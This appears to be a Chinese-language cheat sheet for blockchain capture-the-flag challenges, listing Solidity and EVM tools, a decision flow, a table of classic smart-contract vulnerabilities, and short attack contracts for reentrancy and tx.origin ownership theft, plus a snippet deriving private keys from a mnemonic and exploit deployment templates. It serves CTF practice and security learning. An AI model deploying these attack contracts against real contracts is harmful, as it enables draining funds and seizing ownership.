# 区块链 / 智能合约（Web3）

## 题面识别

题面含：Solidity、合约地址（0x...）、ETH/EVM、ABI、部署交易、Etherscan、ERC-20、ERC-721、Vault、re-entrancy、flash loan、private key 泄露 等。

## 工具栈

```bash
# 编译
solc-select install 0.8.x && solc-select use 0.8.x
solc --bin --abi src.sol -o build/

# 本地链（开题时离线模拟）
ganache --chain.chainId 1337 --account "0xPRIV,100ether"
# 或：
anvil          # foundry 自带

# 与合约交互
cast call <addr> "balanceOf(address)(uint256)" 0xYOUR --rpc-url http://localhost:8545
cast send <addr> "withdraw()" --private-key 0xPRIV --rpc-url http://localhost:8545

# 反编译 EVM 字节码
panoramix <bytecode>
ethervm.io      # 在线
```

## 决策流程

1. 拿合约源码？
   - 有 → 静态审计
   - 没有 → 拿地址先 `cast code <addr> --rpc-url ...` → `panoramix` 反编译
2. 找入口函数（payable / external）
3. 看状态修改条件
4. 找经典漏洞模式（见下）

## 经典漏洞速查

| 漏洞 | 触发 |
|---|---|
| Reentrancy | `external call` 在状态更新之前 |
| Integer Overflow（< 0.8） | 算术无 SafeMath |
| tx.origin 鉴权 | 用 `tx.origin == owner` 而不是 `msg.sender` |
| `delegatecall` 任意 | callee 可控 → 写存储 |
| `selfdestruct` 强制注币 | 绕过 require(this.balance == 0) |
| Storage 冲突 | `delegatecall` 时槽位错位 |
| 时间戳依赖 | `block.timestamp` 当随机数 |
| 区块哈希依赖 | `block.blockhash(...)` 当随机 |
| 价格预言机操纵 | flash loan 操纵 spot price |
| 签名重放 | nonce/chainid 缺失 |
| Front-running | mempool 监听 |

## Reentrancy PoC

```solidity
contract Attack {
    Vault public vault;
    constructor(address v) { vault = Vault(v); }
    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}
```

## tx.origin 攻击

```solidity
contract Attack {
    address owner;
    constructor(address t) { owner = t; }
    function pwn(Target t) external { t.changeOwner(owner); }
    // 受害者签字调用 pwn → 内部用 tx.origin 鉴权 → 改 owner 成攻击者
}
```

## 私钥泄露 / 助记词

```bash
# 从助记词导出私钥
python3 -c "
from eth_account import Account
Account.enable_unaudited_hdwallet_features()
acct = Account.from_mnemonic('word1 word2 ...')
print(acct.address, acct.key.hex())
"

# 公开存储（看 storage slot）
cast storage <addr> 0 --rpc-url ...
cast storage <addr> 1 --rpc-url ...
```

## 部署 + 交互模板

```bash
# foundry / forge
forge init exploit
cd exploit
# src/Attack.sol 写 PoC
forge script script/Run.s.sol --rpc-url ... --private-key ... --broadcast
```

## hardhat 类似

```bash
npx hardhat node           # 本地链
npx hardhat run scripts/exploit.js --network localhost
```

## EVM 字节码分析

```bash
# 拿 runtime bytecode
cast code <addr> --rpc-url ...
# 反编译
panoramix <bytecode>
# 或在线 https://library.dedaub.com/decompile

# disassemble
echo <bytecode> | evmdis
```

## CTF 常用 RPC

题目通常给：
- RPC URL
- ChainID
- 已分配账户 / 私钥
- 题目合约地址
- setup() 部署 / `isSolved()` 校验函数

逐项确认后写 PoC。
